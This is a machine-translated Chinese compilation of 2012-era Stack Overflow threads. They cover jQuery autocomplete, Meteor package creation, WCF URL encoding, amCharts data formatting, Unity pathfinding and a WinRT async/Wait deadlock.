我没有在您的 ajax 调用（`type`参数）中看到指定的 HTTP 方法，因此它默认为 GET 并且 GET 不能包含内容。使用 GET 时传递数据的唯一方法是通过 URL 参数。顺便提一句。因为你的方法只是获取数据，它应该使用 GET 请求。

因此，而不是 JSON，只发送：

```
var dataCity = "prefix=" +  encodeURIComponent(request.term); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-12T19:07:28.167

实际上，我在代码中犯了一些错误。我应该映射返回的结果，在这种情况下是 data.d。这是工作代码。

```
$("input[type=text][id*=autocompleteBox]").autocomplete({

        source: function (request, response) {

            var data = { 'prefix': request.term};

            $.ajax({
                type: "POST",
                url: "http://localhost:1939/Cities.svc/GetCities",
                contentType: "application/json; charset=utf-8",
                dataType: "json",
                data: JSON.stringify(data),
                processdata: true,
                success: function (result) {
                    response($.map(result.d, function (item) {
                        return {
                            label: item
                        };
                    }));
                },
                error: function (er) {
                    alert(er);
                }
            });
        },
        minLength: 1,
        open: function () {
            $(this).removeClass("ui-corner-all").addClass("ui-corner-top");
        },
        close: function () {
            $(this).removeClass("ui-corner-top").addClass("ui-corner-all");
        }
    }); 
```

# meteor - 如何构建 Meteor 智能包

> ID：10114526
> 
> 赞同：42
> 
> 时间：2012-04-11T21:53:45.977
> 
> 标签：meteor, package

一个人如何构建一个会出现的[Meteor 智能包](http://docs.meteor.com/#packages)`meteor list`？

构建[Atmosphere包的](http://atmosphere.meteor.com)[文档](https://atmosphere.meteor.com/wtf/package)相当完善，但构建 Meteor 包却没有。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2014-05-30T08:33:09.633

Meteor 现在支持**`create --package`**命令。

请参阅[流星文档](http://docs.meteor.com/#/full/writingpackages)。

示例（将您自己的[流星开发者帐户](https://www.meteor.com/services/developer-accounts)替换为“cunneen”）：

```
meteor create --package cunneen:foo 
```

输出：

`cunneen:foo: created in your app`

结果：

**包/cunneen:foo/package.js**

```
Package.describe({
  name: 'cunneen:foo',
  version: '0.0.1',
  // Brief, one-line summary of the package.
  summary: '',
  // URL to the Git repository containing the source code for this package.
  git: '',
  // By default, Meteor will default to using README.md for documentation.
  // To avoid submitting documentation, set this field to null.
  documentation: 'README.md'
});

Package.onUse(function(api) {
  api.versionsFrom('1.0.3.1');
  api.addFiles('cunneen:foo.js');
});

Package.onTest(function(api) {
  api.use('tinytest');
  api.use('cunneen:foo');
  api.addFiles('cunneen:foo-tests.js');
}); 
```

**包/cunneen:foo/foo.js（空文件）**

```
// Write your package code here! 
```

**包/cunneen:foo/foo-tests.js**

```
// Write your tests here!
// Here is an example.
Tinytest.add('example', function (test) {
  test.equal(true, true);
}); 
```

**包/cunneen:foo/README.md（空文件）**

```
# cunneen:foo package 
```

对于一个好的（非常全面的）示例，请查看[iron-router](https://github.com/EventedMind/iron-router)。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2013-08-15T19:02:04.480

请参阅下面的鞋匠的[答案](https://stackoverflow.com/a/23950265/1114274)

**以下是过时的信息：**

查看有关*新*流星包装系统的信息： [https ://meteorhacks.com/meteor-weekly-meteor-09-rc-meteor-new-logo-underscore-in-templates.html](https://meteorhacks.com/meteor-weekly-meteor-09-rc-meteor-new-logo-underscore-in-templates.html)

** 旧信息 **

有关于[编写自己的包](http://docs.meteor.com/#writingpackages)和[重新打包现有的 3rd 方库](https://github.com/awwx/misc/wiki/Packaging-Existing-Libraries-for-Meteor)的更新信息。不过，API 在 1.0 之前都不会稳定，因此请准备好进行许多更改。

我已经包含了样板来帮助它同时成为一个节点和一个流星可用的库。这花了我相当长的时间来弄清楚，对建议持开放态度。

**包：/lib/my.js**

```
if (typeof Meteor === 'undefined) {
    // Not Running In Meteor (nodejs code)
    // example NPM/Node Dependencies that we'll use
    var async = require('async');
    var debug = require('debug')('my:package');
    var mongodb = require('mongodb');

    var http = require('http');  
} else {
    // Running as Meteor Package
    var async = Npm.require('async');
    var debug = Npm.require('debug')('my:package');
    var mongodb = Npm.require('mongodb');

    // node core module 'http'
    // use Npm.require to require node core modules
    // but doesnt need Npm.depends in the package.js file
    var http = Npm.require('http');
}

var constructor = function(property1) {
    this.property1 = property1; // or whatever in your constructor.
};

if (typeof Meteor === 'undefined') {
   // Export it node style
   My = exports = module.exports = constructor; // Limit scope to this nodejs file
} else {
   // Export it meteor style
   My = constructor; // Make it a global
}

// Proceed defining methods / properties as usual.
My.prototype.doStuff = function() { console.log('hello world'); } 
```

**包：/package.js**

```
Package.describe({
  summary: "My Meteor Package"
});

/**
 * Ex: Some NPM Dependencies
 */
Npm.depends({
  'async': '0.2.9',
  'debug': '0.7.2',
  'mongodb': '1.3.18'
});

/**
 * On use we'll add files and export our tool
 */
Package.on_use(function (api) {
  /**
   * Add all the files, in the order of their dependence (eg, if A.js depends on B.js, B.js must be before A.js)
   */
  api.add_files([
    'lib/my.js' // <-- include all the necessary files in the package
    ],
    'server'); // Can be 'server', 'client' , ['client','server']

  /**
   * Only expose the My constructor, only export if meteor > 0.6.5
   */
  api.export && api.export(['My'], 'server'); // 1st arg can be array of exported constructors/objects, 2nd can be 'server', 'client', ['client', 'server']
}); 
```

**流星应用程序：适当的客户端/服务器上下文中的一些文件（如 package.js 中定义的）**

```
var my = new My('a property');
my.doStuff(); // console logs 'hello world' on the server 
```

**流星应用程序： smart.json ，将您的文件添加到包列表**

```
{
    packages:{
        "node-my": {
            "git": "git@github.com:myAccount/node-my.git"
        }
    }
} 
```

**最后**在命令行上运行`mrt install`得到它来安装包..**唷！**

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2012-04-11T22:52:02.167

注意：包开发目前没有记录，API 将会改变。你被警告了！

也就是说，实际上很容易上手：

首先， git clone 一份流星 repo 的副本。在 /packages 中为自己创建一个新目录。将 package.js 文件放在目录中（参见其他包的示例）。现在你有一个包裹！

接下来，从结帐处运行流星脚本（不是安装程序安装的那个）。从结帐运行时，脚本将使用结帐中的本地包目录。当您更改包中的代码时，它甚至会热重载。

查看其他包中的示例并了解 API 的作用。

编辑：在第三方软件包方面取得了很大进展。查看[http://oortcloud.github.com/meteorite/](http://oortcloud.github.com/meteorite/)和[https://atmosphere.meteor.com/](https://atmosphere.meteor.com/)

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2013-05-28T08:23:34.080

这是 2013 年 6 月 12 日的日期。这是当时的正确答案，仍然是另一种解决方案：

就像 n1mmy 说的。它是无证的，你应该使用陨石。

如果你坚持用流星创建一个包，我找到了一个很好的非官方 How-to，但你真的不应该这样做。Meteor 将在即将发布的版本中提供一种创建包的方法。

构建 Meteor 包： [https ://coderwall.com/p/ork35q](https://coderwall.com/p/ork35q)

**我会做的方式是使用陨石**

显然你有节点，我假设你有节点包管理器（npm），所以迄今为止制作流星包的最佳方法是制作陨石智能包。

```
npm install meteorite 
```

Meteorite 智能包包含创建包所必需的 2 个关键文件 - package.js - smart.json

陨石文件存储在您的系统登录用户帐户下：~/.meteorite/
但符号链接到您当前创建流星应用程序的位置：project/.meteor/meteorite/

**示例 package.js：**

```
Package.describe({
   summary: "User analytics suite for meteor"
});

Package.on_use(function (api) {
   api.add_files('user_analytics.js', 'client');
}); 
```

**示例 smart.json**

```
{
   "name": "User analytics",
   "description": "User Analytics",
   "homepage": "http://yourHomepage.com",
   "author": "Eric Leroy",
   "version": "0.1",
   "git": "https://github.com/yipyo",
   "packages" : {}
} 
```

如果你需要更多信息，你应该从列表中安装一个 mrt 包：

```
mrt list 
```

然后分析你的 app/.meteor/meteorite/ 目录下的文件。

希望这会有所帮助，并继续开发未来最好的语言。

以下是一些有用的链接：

*   [http://www.eventedmind.com/](http://www.eventedmind.com/) - 解释 Meteor 核心概念的优秀教程
*   [发布氛围包](https://atmospherejs.com/docs/publishing)
*   [非官方流星常见问题](https://github.com/oortcloud/unofficial-meteor-faq)
*   [使用 Meteor 制作聊天室应用](http://net.tutsplus.com/tutorials/javascript-ajax/prototyping-with-meteor/)

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2013-07-10T21:33:26.117

[EventedMind](http://www.eventedmind.com/posts/meteor-introducing-the-package-system)上有一个关于这个主题的很好的截屏视频。

# vb.net - 表单不聚焦时自定义按钮接收边框

> ID：10114527
> 
> 赞同：0
> 
> 时间：2012-04-11T21:53:53.853
> 
> 标签：vb.net, winforms

对于将鼠标悬停在按钮上并获得不需要的边框的人，我已经看到了很多问题。

但是，我的问题是不同的。我的按钮与自定义图像、鼠标悬停和单击完全一致。我的问题是，当我生成多个表单时，每个附加表单的按钮周围都有一个边框，除非我关注该**表单**，否则边框就会消失。

任何线索可能导致这种情况？

[![按钮示例图像](../Images/ee7085e093933cc693b2c73f900b79c5.png)](https://i.stack.imgur.com/fUFG0.jpg)
[（来源：[tec-systems.com](http://www.tec-systems.com/external/buttonexample.jpg)）]

1.  背景色 - 透明
2.  背景图像 - 无
3.  扁平外观

    *   边框颜色 - 空白
    *   边框尺寸 - 0
    *   MouseDown - 透明
    *   鼠标悬停 - 透明
4.  扁平风格 - 扁平

我将不胜感激任何见解！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2022-01-12T06:22:03.367

这解决了问题

> 按钮.TabStop = false;

# asp.net - 使用 webrequest getmethod 使用 wcf 服务给出 404 错误

> ID：10114531
> 
> 赞同：0
> 
> 时间：2012-04-11T21:54:09.310
> 
> 标签：asp.net, wcf, c#-4.0, httpwebrequest, wcf-binding

我用 Http WebRequest 调用我的 WCF WebService。它工作正常，但是当我在参数中传递一些特殊字符时，它会给出错误 404。找不到页面..

这是我的代码片段。

```
[OperationContract]
        [WebInvoke(Method = "GET",
            ResponseFormat = WebMessageFormat.Json,
            BodyStyle = WebMessageBodyStyle.Wrapped,
            UriTemplate = "Data/{username}/{password}")]
        string RequestData(string userName, string password);
    public string RequestData(string userName, string password)
        {
             // Here is My Logic Comes

         }

// Here im Calling This Service in My ASPX Page 

HttpWebRequest req = null;
            HttpWebResponse res = null;
            try
            {
                const string url = "http://localhost:53366/AuthService.svc/Data/test@test.com/password#1"; // Here Gives Error 404 Page Not Found

//const string url = "http://localhost:53366/AuthService.svc/Data/test/password"; // Here Works Fine When I Pass This Paramters Without Special Characters
                req = (HttpWebRequest)WebRequest.Create(url);
                req.Method = "Get";
                req.ContentType = "application/json; charset=utf-8";

                req.Headers.Add("AppID", "MobileApplication");

                res = (HttpWebResponse)req.GetResponse();
                Stream responseStream = res.GetResponseStream();
                var streamReader = new StreamReader(responseStream);

                txtTokenRespoonse.Text = streamReader.ReadToEnd();

                streamReader.Close();
                streamReader.Dispose();

                responseStream.Close();
                responseStream.Dispose();
            } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T10:17:46.950

如果您想将任何特殊字符传递给 URL，您必须对其进行编码！

尝试：

```
const string url = "http://localhost:53366/AuthService.svc/Data/test%40test.com/password%231"; 
```

顺便提一句。在 URL 中传递密码只是一个示例，不是吗？

# .htaccess - 将 CakePHP 文件夹添加到现有域

> ID：10114541
> 
> 赞同：0
> 
> 时间：2012-04-11T21:55:35.770
> 
> 标签：.htaccess, cakephp

现在我们的一些域是 drupal 站点，有一个 cakephp 应用程序与之关联，就像它是该域目录中的一个目录，但 cakephp 应用程序位于该域目录之外。www.domain.com/thecakephpapp 是它的外观以及我将输入的内容以进入 cakephp 部分。但是在 /var/www 中，两者是分开的，例如：

drwxr-xr-x 14 用户 www-data 4096 2011-06-03 15:25 domain.com
drwxr-xr-x 10 用户 www-data 4096 2012-04-11 16:08 cakephpapp

我不知道在哪里将它们联系在一起。这样当我输入 www.domain.com/cakephpapp 时，它会指向 cakephpapp 的位置。我已经看过我之前的那些设置，但无法对其进行头脑或故事。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-12T10:11:00.580

如果我做对了，“var/wwwdomain.com”就是您的 domain.com 网站用作 webroot 的文件夹。如果 cakeapp 在 /var/www/cakeapp 中，最简单的解决方案是对其进行符号链接。

```
ln -s /var/www/cakeapp/webroot /var/www/wwwdomain.com/cakeapp 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T19:26:44.020

我发现你可以用 apache 中的别名做类似的事情。它在你的 apache 配置文件中看起来像这样。

```
Alias /cakeapp /web/cakeapp/webroot 
```

# java - 将数据格式化为 JSON 格式

> ID：10114545
> 
> 赞同：0
> 
> 时间：2012-04-11T21:56:05.250
> 
> 标签：java, json

我正在使用一个图表库，它需要输入看起来像某种格式。这种格式看起来像 JSON，但实际上不是，在这里我分享一些数据来了解格式：

```
[{
                    year: 2005,
                    income: 23.5,
                    expenses: 18.1
                }, {
                    year: 2006,
                    income: 26.2,
                    expenses: 22.8
                }, {
                    year: 2007,
                    income: 30.1,
                    expenses: 23.9
                }, {
                    year: 2008,
                    income: 29.5,
                    expenses: 25.1
                }, {
                    year: 2009,
                    income: 24.6,
                    expenses: 25.0
                }]; 
```

[您可以在此链接](http://www.amcharts.com/javascript/column-and-line-chart-mix/)中查看完整示例。在我的第一次测试中，我使用过，`String.concat(anotherString)`但我向你保证它不舒服。那么有没有提供这种格式的java API？提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:01:33.577

好吧，该格式和 JSON 之间的唯一区别看起来就像您只需要从字符串中删除双引号。所以 data.replaceAll("\"", ""); 应该完成这项工作。

但实际上，阅读示例，它应该接受有效的 JSON。您应该尝试使用 $.ajax() 方法，看起来像：

```
AmCharts.ready(function () {$.ajax({
       url: '/mydata/',
       dataType: 'json',
       data: undefined,
       success: function(chartData) {
                // SERIAL CHART
                chart = new AmCharts.AmSerialChart();
                chart.dataProvider = chartData;
                chart.categoryField = "year";

                // AXES
                // category
                var categoryAxis = chart.categoryAxis;
                categoryAxis.gridAlpha = 0.1;
                categoryAxis.axisAlpha = 0;
                categoryAxis.gridPosition = "start";

                // value
                var valueAxis = new AmCharts.ValueAxis();
                valueAxis.stackType = "regular";
                valueAxis.gridAlpha = 0.1;
                valueAxis.axisAlpha = 0;
                chart.addValueAxis(valueAxis);

                // GRAPHS
                // first graph    
                var graph = new AmCharts.AmGraph();
                graph.title = "Europe";
                graph.labelText = "[[value]]";
                graph.valueField = "europe";
                graph.type = "column";
                graph.lineAlpha = 0;
                graph.fillAlphas = 1;
                graph.lineColor = "#C72C95";
                chart.addGraph(graph);

                // second graph              
                graph = new AmCharts.AmGraph();
                graph.title = "North America";
                graph.labelText = "[[value]]";
                graph.valueField = "namerica";
                graph.type = "column";
                graph.lineAlpha = 0;
                graph.fillAlphas = 1;
                graph.lineColor = "#D8E0BD";
                chart.addGraph(graph);

                // third graph                              
                graph = new AmCharts.AmGraph();
                graph.title = "Asia-Pacific";
                graph.labelText = "[[value]]";
                graph.valueField = "asia";
                graph.type = "column";
                graph.lineAlpha = 0;
                graph.fillAlphas = 1;
                graph.lineColor = "#B3DBD4";
                chart.addGraph(graph);

                // LEGEND                  
                var legend = new AmCharts.AmLegend();
                chart.addLegend(legend);

                // WRITE
                chart.write("chartdiv");
            });
       }
     }); 
```

（对不起，我远不擅长编写javascript，但我认为这个想法就在那里）。此外，也许 amCharts 的 API 可以让您直接检查本地 URL。然后，您只需将 JSON 数据作为 REST 调用进行路由。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-25T10:00:15.793

解决方案很简单：

var chartData = eval(json_data);

此致

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T22:24:44.083

chk 此 API 的数据相关博客页面

```
http://blog.amcharts.com/2011/03/amcharts-javascript-tutorials-part-2.html 
```

我认为本教程讲述了在这个 API 中处理数据的所有细节，其中包含大量示例和代码片段

# c# - Unity 3D C#代码，电脑超载无错误

> ID：10114552
> 
> 赞同：2
> 
> 时间：2012-04-11T21:57:08.327
> 
> 标签：c#, function, unity3d

问题在于 ShowPath(); 方法，因为它不断重载此代码应该收集最短路线，然后在找到开始和结束图块后突出显示它，它会计算到开始的最短路线

```
using UnityEngine;
using System;
using System.Collections.Generic;

namespace PathfindingClass
{
    public class pathFinding
    {
            public  bool startFound = false;
    public TileClass.Tile[,] grid = new TileClass.Tile[AStarPath.gridWidth,AStarPath.gridHeight];
    public Vector2 startTile;
    public Vector2 endTile;
    public Vector2 currentTile;

    // create a list that stores the checked tiles
    List<Vector2> openList = new List<Vector2>();
    List<Vector2> closedList = new List<Vector2>();

    public pathFinding (TileClass.Tile[,] grid)
    {
        this.grid = grid;

    }

    public void SearchPath(Vector2 startTile, Vector2 endTile){
        this.startTile = startTile;
        this.endTile = endTile;

        #region Path Validation
        bool canSearch = true;

        if(grid[(int)startTile.x,(int)startTile.y].walkable ==false){
        canSearch = false;
            Console.WriteLine("the start square is not walkable");
        }
        if(grid[(int)endTile.x,(int)endTile.y].walkable ==false){
        canSearch = false;
            Console.WriteLine("the end square is not walkable");
        }

        #endregion

        if(canSearch){
            //add the starting tile to the open list
        openList.Add(startTile);    
            currentTile = new Vector2(-1,-1);

            //while the open list is not empty
            while(openList.Count > 0){
                currentTile = getTyleWithLowestTotal(openList);

                //if the current tile is the end tile stop searching
                if((int)currentTile.x == (int)endTile.x && (int)currentTile.y == (int)endTile.y  ){
                //  if((int)currentTile.x == (int)endTile.x){
                        break;
                    //}
                }else{
                    openList.Remove(currentTile);
                    closedList.Add(currentTile);

                    //get all the adjacent tiles
                    List<Vector2> adjacentTiles = getAdjacentTiles(currentTile);

                    foreach(Vector2 adjacentTile in adjacentTiles){
                    // the adjacent tile is not aloude within eith of the open or closed lists
                        if(!openList.Contains(adjacentTile)){
                            if(!closedList.Contains(adjacentTile)){
                                // move it to the open list
                                openList.Add(adjacentTile);

                                TileClass.Tile tile = grid[(int)adjacentTile.x,(int)adjacentTile.y];

                                tile.cost = grid[(int)adjacentTile.x,(int)adjacentTile.y].cost+1;

                                //calculate the manhattan distance
                                tile.horistic = ManhattanDistance(adjacentTile);

                                //calculate the total cost
                                tile.total = tile.cost + tile.horistic;

                                tile.color = new Vector4(0,0,1,1);
                                tile.Y=2;
                                }
                        }                           
                    }
                }
            }
        }
        grid[(int)startTile.x,(int)startTile.y].color = Color.yellow;
        grid[(int)endTile.x,(int)endTile.y].color = Color.yellow;

        //Show the shortestPath

        ShowPath();
    }

    public void ShowPath(){
        Vector2 currentTile = endTile;
        List<Vector2> PathTiles = new List<Vector2>();

        while(!startFound){
        List<Vector2> adjacentTiles = getAdjacentTiles(currentTile);

            //check to  see what the used current tile is
            foreach(Vector2 adjacentTile in adjacentTiles){
                if(openList.Contains(adjacentTile) || closedList.Contains(adjacentTile)){

                    grid[(int)adjacentTile.x,(int)adjacentTile.y].color = Color.yellow;

                    if(adjacentTile.x == startTile.x){
                        startFound = true;
                    break;  
                    }
                }
            }
        }           
    }

    //calculate the manhattan distance
    public int ManhattanDistance(Vector2 adjacentTile){
    int manhattan = Math.Abs((int)( endTile.x - adjacentTile.x)) + Math.Abs((int)(endTile.y - adjacentTile.y)); 
        return manhattan;
    }

                    //check the adjacent tiles to the current tile
    public List<Vector2> getAdjacentTiles(Vector2 currentTile){
        List<Vector2> adjacentTiles = new List<Vector2>();
        Vector2 adjacentTile;

        //above
        adjacentTile = new Vector2(currentTile.x,currentTile.y+1);
        if(adjacentTile.y < AStarPath.gridHeight && grid[(int)adjacentTile.x,(int)adjacentTile.y].walkable){
            adjacentTiles.Add(adjacentTile);
        }
                    //below
        adjacentTile = new Vector2(currentTile.x,currentTile.y-1);
        if(adjacentTile.y >= 0 && grid[(int)adjacentTile.x,(int)adjacentTile.y].walkable){
            adjacentTiles.Add(adjacentTile);
        }
                    //right
        adjacentTile = new Vector2(currentTile.x +1,currentTile.y);
        if(adjacentTile.x < AStarPath.gridWidth && grid[(int)adjacentTile.x,(int)adjacentTile.y].walkable){
            adjacentTiles.Add(adjacentTile);
        }
                    //left
        adjacentTile = new Vector2(currentTile.x -1,currentTile.y);
        if(adjacentTile.x >= 0 && grid[(int)adjacentTile.x,(int)adjacentTile.y].walkable){
            adjacentTiles.Add(adjacentTile);
        }

        //optional to add diagonal checking
        return adjacentTiles;
    }   

    // get the tiles with the lowest total value
    public Vector2 getTyleWithLowestTotal(List<Vector2> openList){
        //temp vars
        Vector2 tileWithLowestTotal = new Vector2(-1,-1);
        int lowestTotal = int.MaxValue;

        // search all the open tiles and get the tile with the lowest total cost
        foreach(Vector2 openTile in openList){
            if(grid[(int)openTile.x,(int)openTile.y].total <= lowestTotal){
            lowestTotal = grid[(int)openTile.x,(int)openTile.y].total;
                tileWithLowestTotal = grid[(int)openTile.x,(int)openTile.y].ID;
            }               
        }
    return tileWithLowestTotal;
    }

} 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T22:29:20.823

你有 Unity Pro 吗？如果是这样，您可以使用分析器来查找它在哪里花费更多时间。如果没有，可以`Debugger`在 MonoDevelop 中运行：在代码中放置一些断点并按下`Debug`按钮；它将打开另一个 Unity 实例。然后你播放这个项目，它会在你的断点处停止。从那时起，您可以逐步运行并查看它被锁定的位置。更多信息[在这里](http://unity3d.com/support/documentation/Manual/Debugger.html)。

# jquery - 删除某些标签和它们之间的 html - Jquery

> ID：10114554
> 
> 赞同：-1
> 
> 时间：2012-04-11T21:57:16.710
> 
> 标签：jquery

如果我有一个包含这个的字符串。

```
Hi my name is <span class="name">Joe</span>. Just wanted to say <b>Hi</b>. 
```

我想删除某些标签，包括填充它的标签。此字符串的示例`<span>`仅是标签。

**我会删除**

`<span class="name">Joe</span>`

**...最终的输出将是**

```
Hi my name is . Just wanted to say <b>Hi</b>. 
```

我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:00:24.377

你可以这样做

```
jQuery('<div>' + yourstring + '</div>').find('span').remove(); 
```

或者

```
jQuery('<div>' + yourstring + '</div>').find('.name').remove(); 
```

如果您只想删除具有类“名称”的元素，请选择第二个。

一个工作示例：http: [//jsfiddle.net/ZWw6d/](http://jsfiddle.net/ZWw6d/)

看看文档：[http ://api.jquery.com/remove/](http://api.jquery.com/remove/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T22:04:18.593

jQuery 1.4 或更高版本有两种选择：

`jQuery('.name').remove();`

或者

`jQuery('.name').detach();`

这些是相似的，只是如果元素被重新插入到 DOM 中，分离更合适。

看：

*   [http://api.jquery.com/category/manipulation/dom-removal/](http://api.jquery.com/category/manipulation/dom-removal/)
*   [http://api.jquery.com/detach/](http://api.jquery.com/detach/)

# c# - 为什么文件异步 API 阻塞

> ID：10114555
> 
> 赞同：3
> 
> 时间：2012-04-11T21:57:26.160
> 
> 标签：c#, .net, asynchronous, microsoft-metro

我正在编写一个简单的地铁应用程序。但是，访问文件时 API 会阻塞。通过阻塞，我的意思是程序永远等待。创建/打开文件或文件夹最多需要几秒钟。在这种情况下，它需要永远。

当我运行程序时，它永远不会从 OnTest 中返回。是不是你得到的。我了解 .Wait 将等待文件和文件夹的创建完成。也许这不是很好的设计。然而，这不是重点。

我的问题是：

*   您是否得到相同的行为（永远阻止程序）
*   这是应该发生的事情还是 WinRT 中的错误？（我正在使用消费者预览版）
*   如果这是预期的行为，为什么它需要永远？

这是 XAML 代码：

```
<Button Click="OnTest">Test</Button> 
```

这是 C# 代码：

```
 private async void OnTest(object sender, RoutedEventArgs e)
        {
            var t = new Cache("test1");
            t = new Cache("test2");
            t = new Cache("test3");
        }
        class Cache
        {
            public Cache(string name)
            {
                TestRetrieve(name).Wait();
            }
            public static async Task TestRetrieve(string name) 
            {
                StorageFolder rootFolder = ApplicationData.Current.LocalFolder;
                var _folder = await rootFolder.CreateFolderAsync(name, CreationCollisionOption.OpenIfExists);
                var file = await _folder.CreateFileAsync("test.xml", CreationCollisionOption.OpenIfExists);
            }
        } 
```

它在第二次调用 new Cache("test2"); 时阻塞。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-04-11T23:13:06.227

我没有尝试运行您的程序或重现您的问题，但我可以对正在发生的事情做出有根据的猜测。

假设您为自己编写了以下待办事项列表：

*   在邮箱里放一封给妈妈的信。
*   我一读到她的回复，就设置闹钟叫醒我。
*   去睡觉。
*   检查邮箱是否有回复。
*   阅读回复。

现在严格按照从上到下的顺序执行该列表中的所有操作。发生什么了？

问题不在于邮局或妈妈；他们正在拿起你放在邮箱里的信，寄给妈妈，妈妈正在写她的回信，邮局正在把它还给你。问题是你永远无法到达第四步，因为你只有在完成*第五步**之后*才能开始第四步，并且闹钟会叫醒你。你会永远沉睡，因为*你本质上是在等待未来的自己唤醒现在的自己*。

 **> 埃里克，谢谢你的解释。

别客气。

> 但是，我仍然对为什么我的代码不起作用感到困惑。

好的，让我们分解一下。你的程序*真正*做什么？让我们简化一下：

```
void M()
{
    Task tx = GetATask();
    tx.Wait();
}
async Task GetATask()
{
    Task ty = DoFileSystemThingAsync();
    await ty;
    DoSomethingElse();
} 
```

首先：*什么是任务*？任务是一个对象，它代表 (1) 待完成的工作，以及 (2)任务*继续的委托：任务完成**后*需要发生的事情。

所以你调用GetATask。它有什么作用？好吧，它做的第一件事就是创建一个任务并将其存储在 ty. 该任务表示“在磁盘上开始一些操作，并在完成时通知 I/O 完成线程”的作业。

该任务的*延续是什么？*完成该任务后必须发生*什么*？需要调用 DoSomethingElse。因此编译器将*await*转换为一堆代码，告诉任务确保在任务完成时调用 DoSomethingElse。

一旦设置了 I/O 任务的继续，*GetATask 方法就会*向调用者返回一个任务。*那是什么任务？*这是与存储到 ty.xml 中的任务*不同的任务。*返回的任务是表示作业的任务，它*执行 GetATask 方法需要执行的所有操作*。

该任务的延续是什么？我们不知道！这*由 GetATask 的调用者*决定。

好的，让我们回顾一下。我们有两个任务对象。一个代表任务“在文件系统上做这件事”。它将在文件系统完成工作时完成。它的延续是“调用 DoSomething”。我们有第二个任务对象，它表示“在 GetATask 的主体中执行所有操作”的作业。它将*在对 DoSomethingElse 的调用返回后*完成。

同样：当文件 I/O 成功时，第一个任务将*完成。*发生这种情况时，文件 I/O 完成线程将向主线程发送一条消息，说“嘿，您等待的文件 I/O 已完成。我告诉您这是因为现在是您调用 DoSomethingElse 的时候了”。

但是主线程*没有检查它的消息队列*。为什么不？因为**您告诉它同步等待 GetATask 中的所有内容，包括 DoSomethingElse，完成**。但是现在无法处理告诉您*运行 DoSomethingElse的**消息，**因为您正在等待 DoSomethingElse 完成*。

 **现在清楚了吗？您是在告诉您的线程等到您的线程完成运行 DoSomethingElse **，然后**再检查“请调用 DoSomethingElse”是否在要在该线程上执行的工作队列中！你一直在等待，直到你*读完妈妈的来信*，但*你在同步等待的事实意味着你并没有检查你的邮箱，看看信是否已经到达*。

在这种情况下调用 Wait 显然是错误的，因为您正在等待*自己在未来做某事*，而那是行不通的。但更一般地说，调用 Wait**首先完全否定了异步的全部意义**。只是不要那样做；说“我想异步”和“但我想同步等待”都没有任何意义。那些是对立的。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-04-11T22:11:24.333

您在`Wait()`Cache 类的构造函数中使用。这将一直阻塞，直到当前异步执行的所有内容完成。

这不是设计这个的方法。构造函数和异步没有意义。也许像这样的工厂方法方法会更好：

```
public class Cache
{
    private string cacheName;

    private Cache(string cacheName)
    {
        this.cacheName = cacheName;
    }

    public static async Cache GetCacheAsync(string cacheName)
    {
         Cache cache = new Cache(cacheName);

         await cache.Initialize();

         return cache;
    }

    private async void Initialize()    
    {   
            StorageFolder rootFolder = ApplicationData.Current.LocalFolder;   
            var _folder = await rootFolder.CreateFolderAsync(this.cacheName, CreationCollisionOption.OpenIfExists);   
            var file = await _folder.CreateFileAsync("test.xml", CreationCollisionOption.OpenIfExists);
   }
} 
```

然后你像这样使用它：

```
await Task.WhenAll(Cache.GetCacheAsync("cache1"), Cache.GetCacheAsync("cache2"), Cache.GetCacheAsync("cache3")); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T22:08:55.950

```
TestRetrieve(name).Wait(); 
```

你告诉它通过使用`.Wait()`调用来专门阻止。

删除`.Wait()`它，它不应该再阻塞了。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-20T08:53:34.577

现有的答案提供了非常详尽的解释，解释了它为什么会被阻塞，以及如何让它不被阻塞的代码示例，但这些都是比一些用户理解的“更多信息”。这是一个更简单的“面向机制”的解释..

async/await 模式的工作方式，每次等待异步方法时，都是将该方法的异步上下文“附加”到当前方法的异步上下文。想象 await 作为传递一个神奇的隐藏参数“上下文”。这个上下文参数允许嵌套的等待调用附加到现有的异步上下文。（这只是一个类比……细节比这更复杂）

如果您在异步方法中，并且同步调用方法，则该同步方法不会获得神奇的隐藏异步上下文参数，因此它无法附加任何内容。然后使用“等待”在该方法内创建新的异步上下文是无效的操作，因为新上下文不会附加到线程现有的顶级异步上下文（因为您没有它！）。

根据代码示例进行描述，TestRetrieve(name).Wait(); 没有做你认为它正在做的事情。它实际上是在告诉当前线程重新进入顶部的 async-activity-wait-loop。在此示例中，这是 UI 线程，称为 OnTest 处理程序。下面的图片可能会有所帮助：

UI线程上下文看起来像这样......

```
UI-Thread ->
    OnTest 
```

由于您一直没有连接的等待/异步调用链，因此您从未将 TestRetrieve 异步上下文“附加”到上述 UI-Thread 异步链。实际上，您创建的新上下文只是在任何地方悬空因此，当您“等待”UIThread 时，它会直接回到顶部。

为了使异步工作，您需要通过您需要执行的所有异步操作，从顶级同步线程（在本例中是 UI 线程执行此操作）保持连接的异步/等待链。您不能使构造函数异步，因此不能将异步上下文链接到构造函数。您需要同步构造对象，然后从外部等待 TestRetrieve。从构造函数中删除“等待”行并执行此操作...

```
await (new Cache("test1")).TestRetrieve("test1"); 
```

执行此操作时，“TestRetrieve”异步上下文已正确附加，因此链如下所示：

```
UI-Thread ->
    OnTest ->
        TestRetrieve 
```

